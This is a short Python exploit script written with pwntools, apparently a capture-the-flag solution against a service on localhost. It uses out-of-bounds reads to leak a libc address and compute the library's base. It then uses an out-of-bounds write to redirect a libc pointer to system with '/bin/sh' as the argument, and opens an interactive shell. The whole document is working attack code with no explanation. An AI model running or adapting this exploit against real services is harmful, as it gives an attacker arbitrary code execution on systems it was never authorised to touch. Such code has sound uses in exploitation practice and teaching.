#!/usr/bin/env python3
from pwn import *

# SETTINGS


libc = ELF("./libc.so.6")

LOG_LEVEL = "DEBUG"

r = remote('127.0.0.1', 13774)
# SPLOIT #
r.sendlineafter(b": ", "/bin/sh\x00")
size = 1024 * 1024 # allocated size is *8 
r.sendlineafter(b": ", str(size).encode())

# leak libc
read_offset = int(size + (0x218FF0/8) + 0x7fe)
r.sendlineafter(b": ", str(read_offset).encode())
libc_base = int(r.recvline().strip().split(b": ")[1].decode()) - libc.symbols['malloc']
print("[+] LIBC: {}".format(hex(libc_base)))

# write
write_offset = int(size + (0x219098/8) + 0x7fe)
r.sendlineafter(b": ", str(write_offset).encode())
r.sendlineafter(b": ", str(libc_base+libc.symbols['system']).encode())

r.interactive()
